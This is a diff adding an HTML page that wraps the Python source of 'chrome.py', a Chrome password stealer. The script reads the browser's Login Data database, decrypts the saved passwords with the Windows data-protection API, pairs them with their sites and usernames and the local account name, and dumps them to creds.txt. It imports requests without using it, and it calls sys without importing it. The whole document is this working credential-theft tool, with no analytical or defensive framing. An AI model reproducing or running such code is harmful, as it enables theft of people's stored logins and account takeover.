@@ -1,0 +1,75 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>chrome.py</title>
+</head><body>import os<br/>
+import sqlite3<br/>
+import requests<br/>
+import getpass<br/>
+import json<br/>
+import win32crypt<br/>
+<br/>
+def main():<br/>
+&nbsp; &nbsp; write()<br/>
+<br/>
+<br/>
+def getpasswords():<br/>
+<br/>
+&nbsp; &nbsp; dataToBeSent = {}<br/>
+&nbsp; &nbsp; dataList = []<br/>
+&nbsp; &nbsp; path = getpath()<br/>
+&nbsp; &nbsp; try:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; connection = sqlite3.connect(path + "Login Data")<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cursor = connection.cursor()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; v = cursor.execute(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'SELECT action_url, username_value, password_value FROM logins')<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; value = v.fetchall()<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; for origin_url, username, password in value:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; password = win32crypt.CryptUnprotectData(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; password, None, None, None, 0)[1]<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if password:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dataList.append({<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'origin_url': origin_url,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'username': username,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'password': str(password)[2:-1]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; })<br/>
+<br/>
+&nbsp; &nbsp; except sqlite3.OperationalError as e:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; e = str(e)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (e == 'database is locked'):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print('[!] Make sure Google Chrome is not running in the background')<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; elif (e == 'no such table: logins'):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print('[!] Something wrong with the database name')<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; elif (e == 'unable to open database file'):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print('[!] Something wrong with the database path')<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; else:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(e)<br/>
+<br/>
+&nbsp; &nbsp; dataToBeSent["user"] = getpass.getuser()<br/>
+&nbsp; &nbsp; dataToBeSent["passwords"] = dataList<br/>
+&nbsp; &nbsp; return dataToBeSent<br/>
+<br/>
+<br/>
+def write():<br/>
+&#09;jsonData = getpasswords()<br/>
+&#09;credsString = json.dumps(jsonData)<br/>
+&#09;file = open("creds.txt", "w")<br/>
+&#09;file.write (credsString)<br/>
+&#09;file.close()<br/>
+<br/>
+def getpath():<br/>
+<br/>
+&nbsp; &nbsp; PathName = os.getenv('localappdata') + \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'\\Google\\Chrome\\User Data\\Default\\'<br/>
+&nbsp; &nbsp; if not os.path.isdir(PathName):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; print('[!] Chrome Doesn\'t exists')<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; sys.exit(0)<br/>
+<br/>
+&nbsp; &nbsp; return PathName<br/>
+<br/>
+if __name__== '__main__':<br/>
+&nbsp; &nbsp; main()<br/>
+</body></html>
